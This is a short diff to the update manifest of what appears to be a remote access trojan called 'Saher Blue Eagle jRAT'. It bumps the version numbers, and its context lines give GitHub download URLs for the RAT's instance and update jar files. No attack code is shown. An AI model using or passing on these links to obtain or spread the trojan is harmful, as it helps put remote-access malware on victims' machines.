@@ -7,8 +7,8 @@
 set Values = "_
 jsz=3
 jname=Saher Blue Eagle jRAT
-jupdate=1.35
-jversion=1.3
+jupdate=1.4
+jversion=1.35
 joptions=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Release/SBEjRAT_Instance.jar
 jold_instance=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Old_Instance/SBEjRAT_Instance.jar
 jmain_update=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Release/SBEjRAT.jar
